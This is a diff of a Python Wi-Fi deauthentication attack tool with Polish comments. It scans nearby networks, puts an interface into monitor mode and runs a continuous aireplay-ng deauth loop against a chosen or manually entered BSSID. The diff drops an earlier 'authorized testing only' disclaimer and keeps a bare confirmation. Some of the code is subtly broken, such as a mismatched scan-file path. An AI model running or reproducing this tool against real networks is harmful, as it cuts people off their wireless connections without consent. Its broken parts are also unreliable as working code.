@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# deauth.py - Python implementation of deauth.sh
 
 import os
 import sys
@@ -6,9 +7,9 @@ import time
 import subprocess
 import signal
 import logging
-from typing import Dict, Optional
+from typing import List, Dict, Optional
 
-logging.basicConfig(level=logging.INFO, format="%(message)s")
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
 COLOR_ENABLED = sys.stdout.isatty()
 COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
@@ -29,531 +30,493 @@ def style(text: str, *styles: str) -> str:
     return f"{prefix}{text}{COLOR_RESET}" if prefix else text
 
 
-def get_interface_chipset(interface: str) -> str:
+def run_command(cmd: List[str], check: bool = True, capture: bool = False) -> Optional[str]:
+    """Uruchom komendę i zwróć output jeśli capture=True"""
     try:
-        result = subprocess.run(
-            ["ethtool", "-i", interface],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL,
-            text=True,
-            check=False,
-        )
-    except FileNotFoundError:
-        return "unknown"
-
-    if result.returncode != 0:
-        return "unknown"
-
-    driver = None
-    bus_info = None
-    for line in result.stdout.splitlines():
-        if line.startswith("driver:"):
-            driver = line.split(":", 1)[1].strip()
-        if line.startswith("bus-info:"):
-            bus_info = line.split(":", 1)[1].strip()
-
-    if driver and bus_info and bus_info != "":
-        return f"{driver} ({bus_info})"
-    if driver:
-        return driver
-    return "unknown"
+        if capture:
+            result = subprocess.run(cmd, check=check, capture_output=True, text=True)
+            return result.stdout.strip()
+        else:
+            subprocess.run(cmd, check=check)
+            return None
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Command failed: {' '.join(cmd)}")
+        logging.error(f"Error: {e}")
+        if check:
+            raise
+        return None
 
 
-def list_network_interfaces() -> list:
+def list_interfaces() -> List[str]:
+    """Zwróć listę dostępnych interfejsów sieciowych"""
     interfaces = []
-    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
-    for line in ip_link.stdout.splitlines():
-        if ": " in line:
-            name = line.split(": ", 1)[1].split(":", 1)[0]
-            if name and name != "lo":
-                interfaces.append(name)
-    return interfaces
-
-
-def get_interface_mode(interface: str) -> Optional[str]:
-    result = subprocess.run(
-        ["iw", "dev", interface, "info"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True,
-        check=False,
-    )
-    if result.returncode != 0:
-        return None
-    for raw_line in result.stdout.splitlines():
-        line = raw_line.strip()
-        if line.startswith("type "):
-            parts = line.split()
-            if len(parts) >= 2:
-                return parts[1]
-    return None
-
-
-def is_monitor_mode(interface: str) -> bool:
-    return get_interface_mode(interface) == "monitor"
-
-
-def set_interface_type(interface: str, mode: str) -> bool:
     try:
-        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
-        result = subprocess.run(
-            ["iw", "dev", interface, "set", "type", mode],
-            stderr=subprocess.PIPE,
-            text=True,
-            check=False,
-        )
-        if result.returncode != 0:
-            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
-            return False
-        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
-        time.sleep(0.5)
+        # Używamy ip zamiast ifconfig (nowocześniejsze)
+        result = run_command(["ip", "-o", "link", "show"], capture=True)
+        if result:
+            for line in result.split('\n'):
+                if ': ' in line:
+                    parts = line.split(': ')
+                    if len(parts) > 1:
+                        iface = parts[1].split(':')[0]
+                        if iface and iface != 'lo':
+                            interfaces.append(iface)
+    except:
+        # Fallback na ifconfig
+        try:
+            result = run_command(["ifconfig", "-a"], capture=True)
+            if result:
+                for line in result.split('\n'):
+                    if line and not line.startswith(' ') and not line.startswith('\t'):
+                        iface = line.split(':')[0].split()[0]
+                        if iface and iface != 'lo':
+                            interfaces.append(iface)
+        except:
+            pass
+    
+    return list(set(interfaces))  # Usuń duplikaty
+
+
+def get_interface_info(interface: str) -> Dict[str, str]:
+    """Pobierz informacje o interfejsie"""
+    info = {"driver": "unknown", "chipset": "unknown", "mode": "unknown"}
+    
+    # Sprawdź tryb
+    try:
+        result = run_command(["iwconfig", interface], capture=True, check=False)
+        if result:
+            for line in result.split('\n'):
+                if 'Mode:' in line:
+                    info['mode'] = line.split('Mode:')[1].split()[0].strip()
+    except:
+        pass
+    
+    # Sprawdź driver/chipset przez ethtool
+    try:
+        result = run_command(["ethtool", "-i", interface], capture=True, check=False)
+        if result:
+            for line in result.split('\n'):
+                if 'driver:' in line:
+                    info['driver'] = line.split(':')[1].strip()
+                if 'bus-info:' in line:
+                    info['chipset'] = line.split(':')[1].strip()
+    except:
+        pass
+    
+    return info
+
+
+def setup_monitor_mode(interface: str) -> bool:
+    """Konfiguruj interfejs w trybie monitora - identycznie jak w bash"""
+    try:
+        logging.info(f"Taking interface {interface} down")
+        run_command(["ifconfig", interface, "down"])
+        
+        logging.info(f"Enabling monitor mode on {interface}")
+        run_command(["iwconfig", interface, "mode", "monitor"])
+        
+        logging.info(f"Getting interface {interface} up")
+        run_command(["ifconfig", interface, "up"])
+        
         return True
-    except Exception as exc:
-        logging.error("Failed to set %s mode: %s", mode, exc)
+    except Exception as e:
+        logging.error(f"Failed to setup monitor mode: {e}")
         return False
 
 
-def parse_channel_value(text: str) -> Optional[int]:
+def scan_networks(interface: str, duration: int = 10) -> List[Dict[str, str]]:
+    """Skanuj sieci WiFi"""
+    networks = []
+    
+    # Najpierw upewnij się że interfejs jest w monitor mode
     try:
-        return int(text)
-    except (TypeError, ValueError):
-        return None
-
-
-def parse_freq_value(text: str) -> Optional[float]:
+        run_command(["iwconfig", interface, "mode", "monitor"], check=False)
+    except:
+        pass
+    
+    # Użyj airodump-ng do skanowania
+    temp_file = "/tmp/scan_output.csv"
+    
     try:
-        value = float(text)
-    except (TypeError, ValueError):
-        return None
-    if value > 100000:
-        value /= 1000.0
-    return value
-
-
-def freq_to_channel(freq: float) -> Optional[int]:
-    if 2412 <= freq <= 2472:
-        return int((freq - 2407) // 5)
-    if freq == 2484:
-        return 14
-    if 5000 <= freq <= 5825:
-        return int((freq - 5000) // 5)
-    return None
-
-
-def scan_wireless_networks(
-    interface: str,
-    duration_seconds: int = 15,
-    show_progress: bool = False,
-) -> list:
-    def run_scan() -> subprocess.CompletedProcess:
-        return subprocess.run(
-            ["iw", "dev", interface, "scan"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            check=False,
-        )
-
-    end_time = time.time() + max(1, duration_seconds)
-    networks = {}
-    last_remaining = None
-    while time.time() < end_time:
-        if show_progress and COLOR_ENABLED:
-            remaining = max(0, int(end_time - time.time()))
-            if remaining != last_remaining:
-                last_remaining = remaining
-                message = (
-                    f"{style('Scanning', STYLE_BOLD)}... "
-                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
-                )
-                sys.stdout.write("\r" + message)
-                sys.stdout.flush()
+        # Uruchom airodump-ng na krótko
+        cmd = ["airodump-ng", interface, "--write", "/tmp/scan", "--output-format", "csv", "-w", "/tmp/scan"]
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        logging.info(f"Scanning for {duration} seconds...")
+        time.sleep(duration)
+        
+        # Zakończ proces
+        proc.terminate()
         try:
-            result = run_scan()
-        except FileNotFoundError:
-            logging.error("Required tool 'iw' not found!")
-            if show_progress and COLOR_ENABLED:
-                sys.stdout.write("\n")
-            return []
-
-        if result.returncode != 0 and is_monitor_mode(interface):
-            if set_interface_type(interface, "managed"):
-                result = run_scan()
-                if not set_interface_type(interface, "monitor"):
-                    logging.error("Failed to restore monitor mode after scan.")
-
-        if result.returncode != 0:
-            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
-            if show_progress and COLOR_ENABLED:
-                sys.stdout.write("\n")
-            return []
-
-        current = {"bssid": None, "ssid": None, "signal": None, "channel": None}
-        for raw_line in result.stdout.splitlines():
-            line = raw_line.strip()
-            if line.startswith("BSS "):
-                if current.get("bssid") and current.get("ssid"):
-                    existing = networks.get(current["bssid"])
-                    if existing is None or (
-                        current.get("signal") is not None
-                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
-                    ):
-                        networks[current["bssid"]] = current
-                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
-                continue
-            if line.startswith("freq:"):
-                parts = line.split()
-                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
-                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
-                continue
-            if line.startswith("DS Parameter set:"):
-                parts = line.split()
-                if len(parts) >= 4 and parts[-2] == "channel":
-                    channel_val = parse_channel_value(parts[-1])
-                    if channel_val is not None:
-                        current["channel"] = channel_val
-                continue
-            if line.startswith("* primary channel:"):
-                parts = line.split(":")
-                if len(parts) == 2:
-                    channel_val = parse_channel_value(parts[1].strip())
-                    if channel_val is not None:
-                        current["channel"] = channel_val
-                continue
-            if line.startswith("signal:"):
-                parts = line.split()
-                try:
-                    current["signal"] = float(parts[1])
-                except (IndexError, ValueError):
-                    current["signal"] = None
-                continue
-            if line.startswith("SSID:"):
-                ssid_val = line.split(":", 1)[1].strip()
-                current["ssid"] = ssid_val if ssid_val else "<hidden>"
-
-        if current.get("bssid") and current.get("ssid"):
-            existing = networks.get(current["bssid"])
-            if existing is None or (
-                current.get("signal") is not None
-                and (existing.get("signal") is None or current["signal"] > existing["signal"])
-            ):
-                networks[current["bssid"]] = current
-
-        time.sleep(0.2)
-
-    if show_progress and COLOR_ENABLED:
-        sys.stdout.write("\n")
-
-    sorted_networks = sorted(
-        networks.values(),
-        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
-        reverse=True,
-    )
-    return sorted_networks
-
-
-def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
-    while True:
-        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
-        if not networks:
-            logging.warning("No networks found during scan.")
-            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
-            if retry == "y":
-                continue
-            sys.exit(1)
-
-        logging.info("")
-        logging.info(style("Available networks:", STYLE_BOLD))
-        for index, net in enumerate(networks, start=1):
-            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
-            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
-            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
-            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)
-
-        choice = input(
-            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
-        ).strip().lower()
-        if choice == "r":
-            continue
-        if choice.isdigit():
-            idx = int(choice)
-            if 1 <= idx <= len(networks):
-                return networks[idx - 1]
-        logging.warning("Invalid selection. Try again.")
+            proc.wait(timeout=2)
+        except:
+            proc.kill()
+        
+        # Odczytaj wyniki
+        if os.path.exists("/tmp/scan-01.csv"):
+            with open("/tmp-01.csv", "r", encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                
+            # Parsuj CSV
+            lines = content.split('\n')
+            in_ap_section = False
+            
+            for line in lines:
+                line = line.strip()
+                if not line:
+                    continue
+                    
+                if 'Station MAC' in line:
+                    break  # Koniec sekcji AP
+                    
+                if 'BSSID' in line and 'channel' in line.lower():
+                    in_ap_section = True
+                    continue
+                    
+                if in_ap_section and line:
+                    parts = line.split(',')
+                    if len(parts) >= 14:
+                        bssid = parts[0].strip()
+                        channel = parts[3].strip()
+                        essid = parts[13].strip()
+                        
+                        if bssid and essid and channel:
+                            networks.append({
+                                'bssid': bssid,
+                                'channel': channel,
+                                'essid': essid
+                            })
+        
+        # Sprzątanie
+        for f in ["/tmp/scan-01.csv", "/tmp/scan-01.kismet.csv", "/tmp/scan-01.log.csv"]:
+            if os.path.exists(f):
+                os.remove(f)
+                
+    except Exception as e:
+        logging.error(f"Scan failed: {e}")
+        # Fallback na iw
+        try:
+            result = run_command(["iw", "dev", interface, "scan"], capture=True, check=False)
+            if result:
+                current_bssid = None
+                current_channel = None
+                current_essid = None
+                
+                for line in result.split('\n'):
+                    line = line.strip()
+                    if line.startswith('BSS'):
+                        if current_bssid and current_essid and current_channel:
+                            networks.append({
+                                'bssid': current_bssid,
+                                'channel': current_channel,
+                                'essid': current_essid
+                            })
+                        
+                        parts = line.split()
+                        if len(parts) > 1:
+                            current_bssid = parts[1]
+                            current_channel = None
+                            current_essid = None
+                    
+                    elif 'freq:' in line:
+                        try:
+                            freq = float(line.split(':')[1].strip())
+                            if 2412 <= freq <= 2472:
+                                current_channel = str(int((freq - 2412) / 5 + 1))
+                            elif freq == 2484:
+                                current_channel = '14'
+                        except:
+                            pass
+                    
+                    elif 'DS Parameter set:' in line and 'channel' in line:
+                        try:
+                            current_channel = line.split('channel')[1].strip()
+                        except:
+                            pass
+                    
+                    elif 'SSID:' in line:
+                        current_essid = line.split(':', 1)[1].strip()
+                        
+    return networks
 
 
-def select_interface(interfaces: list, prompt_label: str) -> str:
+def select_interface() -> Optional[str]:
+    """Wybierz interfejs z listy"""
+    interfaces = list_interfaces()
+    
     if not interfaces:
-        logging.error("No network interfaces found.")
-        sys.exit(1)
-
-    logging.info("")
+        logging.error("No network interfaces found!")
+        return None
+    
     logging.info(style("Available interfaces:", STYLE_BOLD))
-    for index, name in enumerate(interfaces, start=1):
-        chipset = get_interface_chipset(name)
-        label = f"{index}) {name} -"
-        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)
-
+    for i, iface in enumerate(interfaces, 1):
+        info = get_interface_info(iface)
+        logging.info(f"  {i}) {color_text(iface, COLOR_HIGHLIGHT)} - {info['driver']} ({info['mode']})")
+    
     while True:
-        choice = input(f"{style(prompt_label, STYLE_BOLD)} (number or name): ").strip()
-        if not choice:
-            logging.warning("Please select an interface.")
-            continue
-        if choice.isdigit():
-            idx = int(choice)
-            if 1 <= idx <= len(interfaces):
-                return interfaces[idx - 1]
-        if choice in interfaces:
-            return choice
-        logging.warning("Invalid selection. Try again.")
+        try:
+            choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
+            
+            if not choice:
+                continue
+                
+            if choice.isdigit():
+                idx = int(choice) - 1
+                if 0 <= idx < len(interfaces):
+                    return interfaces[idx]
+            elif choice in interfaces:
+                return choice
+                
+            logging.warning("Invalid selection. Try again.")
+        except KeyboardInterrupt:
+            return None
 
 
-def enable_monitor_mode(interface: str, channel: Optional[int]) -> bool:
+def select_network(interface: str) -> Optional[Dict[str, str]]:
+    """Wybierz sieć do ataku"""
+    logging.info("Scanning for networks...")
+    networks = scan_networks(interface, 10)
+    
+    if not networks:
+        logging.error("No networks found!")
+        return None
+    
+    logging.info(style("Available networks:", STYLE_BOLD))
+    for i, net in enumerate(networks[:20], 1):  # Pokaż tylko pierwsze 20
+        logging.info(f"  {i}) {color_text(net['essid'], COLOR_HIGHLIGHT)} - {net['bssid']} (ch {net['channel']})")
+    
+    while True:
+        try:
+            choice = input(f"{style('Select network', STYLE_BOLD)} (number): ").strip()
+            
+            if choice.isdigit():
+                idx = int(choice) - 1
+                if 0 <= idx < len(networks):
+                    return networks[idx]
+                    
+            logging.warning("Invalid selection. Try again.")
+        except KeyboardInterrupt:
+            return None
+
+
+def set_channel(interface: str, channel: str) -> bool:
+    """Ustaw kanał na interfejsie"""
     try:
-        if not set_interface_type(interface, "monitor"):
-            return False
-        if channel:
-            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
-        if not is_monitor_mode(interface):
-            current_mode = get_interface_mode(interface)
-            logging.error(
-                "Monitor mode not active on %s (current mode: %s).",
-                interface,
-                current_mode or "unknown",
-            )
-            return False
-        logging.info("Monitor mode confirmed on %s.", interface)
+        logging.info(f"Setting interface {interface} to channel {channel}")
+        run_command(["iwconfig", interface, "channel", channel])
         return True
-    except Exception as exc:
-        logging.error("Failed to enable monitor mode: %s", exc)
+    except Exception as e:
+        logging.error(f"Failed to set channel: {e}")
         return False
 
 
-def restore_managed_mode(interface: str) -> None:
+def run_deauth_loop(interface: str, channel: str, bssid: str) -> None:
+    """Główna pętla deauth - identyczna logika jak w bash"""
+    logging.info("=" * 60)
+    logging.info(f"Starting deauth attack on {color_text(bssid, COLOR_RUNNING)}")
+    logging.info(f"Interface: {interface}, Channel: {channel}")
+    logging.info("=" * 60)
+    logging.info(f"Press {style('Ctrl+C', STYLE_BOLD)} to stop")
+    
     try:
-        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
-        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
-    except Exception:
-        pass
-
-
-def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
-    global ATTACK_PROCESS
-    bssid = target["bssid"]
-    channel = target["channel"]
-    if not bssid:
-        logging.error("Missing target BSSID; cannot start attack.")
-        return False
-
-    if channel:
-        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
-
-    try:
-        ATTACK_PROCESS = subprocess.Popen(
-            ["aireplay-ng", "-0", "0", "-a", bssid, interface],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
-            text=True,
-            preexec_fn=os.setsid,
-        )
-    except FileNotFoundError:
-        logging.error("Required tool 'aireplay-ng' not found!")
-        return False
-    except Exception as exc:
-        logging.error("Failed to start deauth attack: %s", exc)
-        return False
-
-    time.sleep(1)
-    if ATTACK_PROCESS.poll() is not None:
-        err_output = ATTACK_PROCESS.stderr.read().strip() if ATTACK_PROCESS.stderr else "unknown error"
-        logging.error("Deauth process exited early: %s", err_output or "unknown error")
-        ATTACK_PROCESS = None
-        return False
-
-    return True
-
-
-def stop_attack() -> None:
-    global ATTACK_PROCESS
-    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
-        try:
+        # Ustaw kanał
+        if not set_channel(interface, channel):
+            return
+            
+        logging.info("Waiting 3 seconds...")
+        time.sleep(3)
+        
+        logging.info("Starting the deauth loop")
+        
+        failure_count = 0
+        while True:
             try:
-                pgid = os.getpgid(ATTACK_PROCESS.pid)
-            except Exception:
-                pgid = None
-            if pgid is not None:
-                try:
-                    os.killpg(pgid, signal.SIGTERM)
-                except Exception:
-                    ATTACK_PROCESS.terminate()
-            else:
-                ATTACK_PROCESS.terminate()
-            ATTACK_PROCESS.wait(timeout=3)
-        except subprocess.TimeoutExpired:
-            try:
-                if pgid is not None:
-                    os.killpg(pgid, signal.SIGKILL)
-                else:
-                    ATTACK_PROCESS.kill()
-            except Exception:
-                try:
-                    ATTACK_PROCESS.kill()
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        try:
-            for _ in range(5):
-                if ATTACK_PROCESS.poll() is not None:
+                logging.info(f"Running deauth to {bssid}")
+                
+                # Uruchom aireplay-ng z --deauth 0 (niekończące się)
+                # Używamy Popen zamiast run żeby móc przechwycić Ctrl+C
+                cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, interface]
+                
+                with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
+                                    text=True, preexec_fn=os.setsid) as proc:
+                    
+                    # Czekaj 10 sekund lub na zakończenie
+                    for _ in range(10):
+                        if proc.poll() is not None:
+                            break
+                        time.sleep(1)
+                    
+                    # Jeśli proces jeszcze działa, zabij go
+                    if proc.poll() is None:
+                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                        proc.wait(timeout=2)
+                
+                failure_count = 0  # Resetuj licznik błędów po sukcesie
+                time.sleep(1)  # Krótka przerwa między cyklami
+                
+            except subprocess.CalledProcessError as e:
+                failure_count += 1
+                logging.warning(f"Deauth failed (attempt {failure_count}): {e}")
+                
+                if failure_count >= 3:
+                    logging.error("Too many failures. Stopping.")
                     break
-                time.sleep(0.2)
-        except Exception:
-            pass
-    ATTACK_PROCESS = None
+                    
+                time.sleep(2)  # Czekaj przed ponowną próbą
+                
+            except Exception as e:
+                logging.error(f"Unexpected error: {e}")
+                break
+                
+    except KeyboardInterrupt:
+        logging.info(color_text("\nDeauth loop stopped by user", COLOR_STOP))
+    except Exception as e:
+        logging.error(f"Error in deauth loop: {e}")
 
 
-def cleanup():
+def cleanup(interface: str) -> None:
+    """Przywróć interfejs do trybu managed"""
     logging.info("Cleaning up...")
+    
     try:
-        stop_attack()
-    except Exception:
+        run_command(["ifconfig", interface, "down"], check=False)
+        run_command(["iwconfig", interface, "mode", "managed"], check=False)
+        run_command(["ifconfig", interface, "up"], check=False)
+    except:
         pass
-
-    if ATTACK_INTERFACE:
-        try:
-            restore_managed_mode(ATTACK_INTERFACE)
-        except Exception:
-            pass
-
+    
     logging.info("Cleanup completed")
 
 
-def disclaimer_confirmed(ssid: str, bssid: str) -> bool:
-    logging.info(style("Disclaimer:", STYLE_BOLD))
-    logging.info(
-        "This tool is intended for authorized testing only. "
-        "You must own the equipment and have explicit permission."
-    )
-    logging.info("Target SSID: %s (%s)", style(ssid, COLOR_SUCCESS, STYLE_BOLD), bssid)
-    choice = input(f"{style('Proceed', STYLE_BOLD)}? (Y/N): ").strip().lower()
-    return choice == "y"
-
-
-def run_deauth_session() -> bool:
-    global ATTACK_INTERFACE, ATTACK_PROCESS
+def check_tools() -> bool:
+    """Sprawdź czy wymagane narzędzia są dostępne"""
+    required_tools = ["ifconfig", "iwconfig", "aireplay-ng", "iw", "ip"]
     
-    ATTACK_PROCESS = None
+    missing = []
+    for tool in required_tools:
+        if run_command(["which", tool], check=False, capture=True) is None:
+            missing.append(tool)
     
-    interfaces = list_network_interfaces()
-    ATTACK_INTERFACE = select_interface(interfaces, "Select attack interface")
-
-    logging.info("")
-    input(f"{style('Press Enter', STYLE_BOLD)} to switch {ATTACK_INTERFACE} to monitor mode...")
-    if not enable_monitor_mode(ATTACK_INTERFACE, None):
+    if missing:
+        logging.error(f"Missing required tools: {', '.join(missing)}")
+        logging.error("Install with: sudo apt install aircrack-ng wireless-tools")
         return False
+    
+    return True
 
+
+def main_cli_mode() -> None:
+    """Tryb CLI - jak oryginalny bash script"""
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <interface> <channel> <bssid>")
+        print(f"Example: {sys.argv[0]} wlan1mon 6 AA:BB:CC:DD:EE:FF")
+        sys.exit(1)
+    
+    interface = sys.argv[1]
+    channel = sys.argv[2]
+    bssid = sys.argv[3]
+    
+    if not check_tools():
+        sys.exit(1)
+    
+    # Sprawdź czy interfejs istnieje
+    interfaces = list_interfaces()
+    if interface not in interfaces:
+        logging.error(f"Interface {interface} not found!")
+        logging.error(f"Available: {', '.join(interfaces)}")
+        sys.exit(1)
+    
+    # Uruchom atak
+    run_deauth_loop(interface, channel, bssid)
+    cleanup(interface)
+
+
+def main_interactive_mode() -> None:
+    """Tryb interaktywny z menu"""
+    logging.info(style("=" * 60, COLOR_HEADER))
+    logging.info(style("        DEAUTH ATTACK TOOL (Python Edition)        ", COLOR_HEADER, STYLE_BOLD))
+    logging.info(style("=" * 60, COLOR_HEADER))
     logging.info("")
-    scan_prompt = (
-        f"{style('Scan duration', STYLE_BOLD)} in seconds "
-        f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): "
-    )
-    scan_input = input(scan_prompt).strip()
-    try:
-        scan_seconds = int(scan_input) if scan_input else 15
-    except ValueError:
-        logging.warning("Invalid duration. Using 15 seconds.")
-        scan_seconds = 15
-    if scan_seconds < 1:
-        logging.warning("Scan duration too short. Using 1 second.")
-        scan_seconds = 1
-
-    logging.info("")
-    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {ATTACK_INTERFACE}...")
-    target_network = select_network(ATTACK_INTERFACE, scan_seconds)
-    logging.info("")
-    logging.info(
-        "Target selected: %s (%s)",
-        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
-        target_network["bssid"],
-    )
-
-    logging.info("")
-    if not disclaimer_confirmed(target_network["ssid"] or "unknown", target_network["bssid"] or "unknown"):
-        logging.info(color_text("Aborted by user.", COLOR_STOP))
-        return False
-
-    if not is_monitor_mode(ATTACK_INTERFACE):
-        logging.warning("Interface left monitor mode; re-enabling.")
-        if not enable_monitor_mode(ATTACK_INTERFACE, target_network.get("channel")):
-            return False
-
-    logging.info("")
-    input(
-        f"{style('Press Enter', STYLE_BOLD)} to start Deauth Attack on "
-        f"{style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)}..."
-    )
-
-    if not start_deauth_attack(ATTACK_INTERFACE, target_network):
-        return False
-
-    logging.info("")
-    logging.info("=" * 50)
-    logging.info(f"Deauth Attack is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
-    logging.info(f"Target: {style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)} ({target_network['bssid']})")
-    logging.info("=" * 50)
-    logging.info(
-        "Press %s to %s",
-        style("Ctrl+C", STYLE_BOLD),
-        style("STOP the attack", COLOR_STOP, STYLE_BOLD),
-    )
-
-    try:
-        while True:
-            time.sleep(1)
-            
-            if ATTACK_PROCESS and ATTACK_PROCESS.poll() is not None:
-                err_output = ""
-                if ATTACK_PROCESS.stderr:
-                    try:
-                        err_output = ATTACK_PROCESS.stderr.read().strip()
-                    except Exception:
-                        err_output = ""
-                logging.warning("Deauth process exited unexpectedly: %s", err_output or "unknown error")
-                
-                time.sleep(2)
-                if not start_deauth_attack(ATTACK_INTERFACE, target_network):
-                    logging.error("Failed to restart deauth attack.")
-                    break
-                    
-    except KeyboardInterrupt:
-        logging.info(color_text("Stopping attack...", COLOR_STOP))
-    finally:
-        cleanup()
-
-    return False
-
-
-def main():
-    logging.info(color_text("Deauth Attack Tool", COLOR_HEADER))
-    logging.info("Continuous Deauthentication Attack")
-    logging.info("")
-
+    
     if os.geteuid() != 0:
         logging.error("This script must be run as root!")
         sys.exit(1)
+    
+    if not check_tools():
+        sys.exit(1)
+    
+    while True:
+        logging.info(style("Main Menu:", STYLE_BOLD))
+        logging.info("  1) Scan and attack (interactive)")
+        logging.info("  2) Direct attack (provide details)")
+        logging.info("  3) Exit")
+        
+        choice = input(f"{style('Select option', STYLE_BOLD)}: ").strip()
+        
+        if choice == '1':
+            # Tryb interaktywny
+            interface = select_interface()
+            if not interface:
+                continue
+                
+            if not setup_monitor_mode(interface):
+                logging.error("Failed to setup monitor mode!")
+                continue
+                
+            network = select_network(interface)
+            if not network:
+                continue
+                
+            logging.info(style("Confirm attack:", STYLE_BOLD))
+            logging.info(f"  Target: {color_text(network['essid'], COLOR_HIGHLIGHT)}")
+            logging.info(f"  BSSID: {network['bssid']}")
+            logging.info(f"  Channel: {network['channel']}")
+            logging.info(f"  Interface: {interface}")
+            
+            confirm = input(f"{style('Proceed with attack?', STYLE_BOLD)} (y/N): ").strip().lower()
+            if confirm == 'y':
+                run_deauth_loop(interface, network['channel'], network['bssid'])
+                cleanup(interface)
+                
+        elif choice == '2':
+            # Tryb bezpośredni
+            interface = input(f"{style('Interface', STYLE_BOLD)} (e.g., wlan1mon): ").strip()
+            channel = input(f"{style('Channel', STYLE_BOLD)} (e.g., 6): ").strip()
+            bssid = input(f"{style('BSSID', STYLE_BOLD)} (e.g., AA:BB:CC:DD:EE:FF): ").strip()
+            
+            if interface and channel and bssid:
+                if not setup_monitor_mode(interface):
+                    logging.error("Failed to setup monitor mode!")
+                    continue
+                    
+                run_deauth_loop(interface, channel, bssid)
+                cleanup(interface)
+            else:
+                logging.warning("All fields are required!")
+                
+        elif choice == '3':
+            logging.info("Goodbye!")
+            break
+            
+        else:
+            logging.warning("Invalid option!")
 
-    required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
-    for tool in required_tools:
-        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
-            logging.error("Required tool '%s' not found!", tool)
-            sys.exit(1)
 
-    import atexit
-    atexit.register(cleanup)
-
-    run_deauth_session()
+def main():
+    """Główna funkcja"""
+    # Sprawdź czy podano argumenty CLI
+    if len(sys.argv) > 1:
+        main_cli_mode()
+    else:
+        main_interactive_mode()
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        logging.info("\nExiting...")
+        sys.exit(0)
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+        sys.exit(1)
